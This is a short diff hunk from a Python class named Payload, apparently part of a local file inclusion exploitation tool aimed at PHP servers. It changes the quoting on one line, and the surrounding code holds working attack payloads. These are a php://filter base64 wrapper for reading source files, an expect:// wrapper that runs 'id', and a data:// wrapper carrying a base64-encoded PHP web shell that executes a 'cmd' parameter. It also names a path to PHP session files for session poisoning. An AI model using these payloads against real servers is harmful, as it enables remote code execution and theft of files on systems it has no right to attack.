@@ -37,7 +37,7 @@ class Payload:
 		self.filterBase = quote("php://filter/read=convert.base64-encode/resource=")
 
 		# Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
-		self.phpHeaders = [quote("expect://id"), "'"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"'"]
+		self.phpHeaders = [quote("expect://id"), '"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"']
 
 		# PHPSESSID Cookie
 		self.cookiePath = "/var/lib/php/sessions/sess_"
